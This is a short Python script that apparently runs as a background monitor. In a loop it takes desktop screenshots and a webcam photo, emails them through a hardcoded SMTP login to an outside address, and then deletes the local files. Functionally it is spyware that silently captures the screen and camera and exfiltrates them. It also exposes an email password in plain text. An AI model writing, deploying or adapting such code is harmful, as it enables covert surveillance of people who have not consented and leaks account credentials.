import yagmail
from PIL import ImageGrab
import cv2
import time
import os
import requests


# To count the number
email = yagmail.SMTP(user="sunnyajie2@163.com", password="5201314asd", host='smtp.163.com')


def screen(i):
	im = ImageGrab.grab()
	im.save("./screenShota" + i + ".png")
	time.sleep(20)
	im.save("./screenShotb" + i + ".png")


def camera(i):
	cap = cv2.VideoCapture(0)
	ret, frame = cap.read()
	cv2.imwrite("./picture" + i + ".jpg", frame)
	cap.release()


def sender(i):
	content = ["no content, pictures were attached!", "./screenShota" + i + ".png",
	"./screenShotb" + i + ".png", "./picture" + i + ".jpg"]
	email.send("1571858518@qq.com", "The computer is working", content)


def delete(i):
	os.remove("./screenShota" + i + ".png")
	os.remove("./screenShotb" + i + ".png")
	os.remove("./picture" + i + ".jpg")


def network():
	try:
		requests.get("https://www.baidu.com")
		return True
	except Exception:
		return False


def timer():
	i = 0
	while True:
		#  If the internet does not work, sleep 5 minutes
		if network():
			i = i + 1
			str_i = str(i)
			screen(str_i)
			camera(str_i)
			sender(str_i)
			time.sleep(5)
			delete(str_i)
			time.sleep(1500)

		else:
			time.sleep(300)


if __name__ == "__main__":
	time.sleep(6)
	timer()